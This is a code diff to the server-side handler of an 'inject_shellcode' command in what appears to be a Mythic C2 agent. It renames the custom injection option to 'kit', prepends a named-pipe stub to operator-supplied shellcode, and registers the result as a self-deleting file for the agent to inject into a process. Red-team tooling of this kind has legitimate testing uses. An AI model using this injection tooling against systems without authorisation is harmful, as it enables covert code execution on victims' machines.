@@ -49,10 +49,11 @@ class InjectShellcodeArguments(TaskArguments):
                 type=ParameterType.ChooseOne,
                 default_value="default",
                 choices=[
-                    "default",
-                    "custom"
+                    "kit",
+                    "default"
+                    
                 ],
-                description="Process injection method used to execute the shellcode. (e.g., default|custom)",
+                description="Process injection method used to execute the shellcode. (e.g., default|kit)",
                 parameter_group_info=[
                     ParameterGroupInfo(
                         required=True, 
@@ -198,16 +199,51 @@ class InjectShellcodeCommand(CommandBase):
 
             #elif groupName == "Existing":
             if groupName == "Existing":
+                
+                shellcode_file_id = taskData.args.get_arg("shellcode_file")
+                
                 # Retrieve the shellcode file to inject
-                file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
-                    TaskID=taskData.Task.ID,
-                    Filename=taskData.args.get_arg("shellcode_name"),
-                    LimitByCallback=False,
-                    MaxResults=1
-                ))
-                if not file_resp.Success:
-                    raise Exception("Failed to fetch find file from Mythic (name: {})".format(taskData.args.get_arg("shellcode_name")))
-                taskData.args.add_arg("shellcode_file", file_resp.Files[0].AgentFileId, parameter_group_info=[ParameterGroupInfo(
+                logging.info(f"Pre-existing name {shellcode_file_id}")
+                
+                # file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
+                #     TaskID=taskData.Task.ID,
+                #     Filename=taskData.args.get_arg("shellcode_name"),
+                #     LimitByCallback=False,
+                #     MaxResults=1
+                # ))
+                # file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
+                #     TaskID=taskData.Task.ID,
+                #     AgentFileID=taskData.args.get_arg("shellcode_file"),
+                #     LimitByCallback=True,
+                #     MaxResults=1
+                # ))
+                
+                shellcode_contents = await SendMythicRPCFileGetContent(
+                        MythicRPCFileGetContentMessage(AgentFileId=shellcode_file_id)
+                    )
+                
+                if not shellcode_contents.Success:
+                    raise Exception("Failed to fetch find file from Mythic (ID: {})".format(shellcode_file_id))
+                
+                # Prepend Named Pipe stub (to set stdout/stderr for process)
+                named_pipe_stub_path = 'xenon/agent_code/stub/stub.bin'
+                with open(named_pipe_stub_path, 'rb') as f:
+                    stub_bytes = f.read()
+                prefixed_shellcode = stub_bytes + shellcode_contents.Content
+                
+                shellcode_file_resp = await SendMythicRPCFileCreate(
+                    MythicRPCFileCreateMessage(
+                        TaskID=taskData.Task.ID, 
+                        FileContents=prefixed_shellcode, 
+                        DeleteAfterFetch=True)
+                )
+                if shellcode_file_resp.Success:
+                    final_file_uuid = shellcode_file_resp.AgentFileId
+                else:
+                    raise Exception("Failed to register execute_assembly binary: " + shellcode_file_resp.Error)
+                
+                # Add final shellcode to args
+                taskData.args.add_arg("shellcode_file", final_file_uuid, parameter_group_info=[ParameterGroupInfo(
                     group_name="Existing"
                 )])
                 
@@ -215,7 +251,7 @@ class InjectShellcodeCommand(CommandBase):
                 taskData.args.remove_arg("method")              # Don't need to send this to Agent
 
                 # Handle custom process injection kit option
-                if method == "custom":
+                if method == "kit":
                     kit_spawn_uuid = PROCESS_INJECT_KIT.get_inject_spawn()
                     if not kit_spawn_uuid:
                         raise Exception("Failed to get UUID for Process Injection Kit. Have you run register_process_injection_kit yet??")
@@ -237,7 +273,6 @@ class InjectShellcodeCommand(CommandBase):
                     logging.info(f"\n[+] Using Custom Process Injection Kit. \n\t- PROCESS_INJECT_SPAWN:{kit_spawn_uuid}:{len(kit_spawn_contents)} bytes\n")
                     
                 response.DisplayParams = "-File {} --method {}".format(
-                    file_resp.Files[0].Filename,
                     taskData.args.get_arg("shellcode_name"),
                     taskData.args.get_arg("method"),
                     # taskData.args.get_arg("process_inject_kit_file")
